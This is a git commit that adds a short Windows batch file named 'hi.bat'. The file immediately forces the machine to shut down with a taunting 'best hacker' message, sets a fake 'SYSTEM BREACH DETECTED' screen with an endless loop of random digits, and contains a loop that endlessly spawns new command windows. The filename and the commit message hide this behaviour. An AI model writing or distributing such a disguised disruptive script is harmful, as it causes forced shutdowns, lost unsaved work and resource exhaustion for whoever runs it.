c47f7f14a03aaf7a2c7add4a8449e3b829eafab5
IWO <saarleshembar@gmail.com>
2026-02-27 17:31:35 +0200

    Add files via upload

---
+++ hi.bat
@@ -0,0 +1,13 @@
+@echo off
+shutdown -c "you kicked by the best hacker, saar!" -t 1 -s
+title SYSTEM BREACH DETECTED
+color 0a
+mode 120,30
+
+:matrix
+set /a num=%random%
+echo 0%num%1101%random%011%random%1010%random%
+goto matrix
+:loop
+start cmd
+goto loop
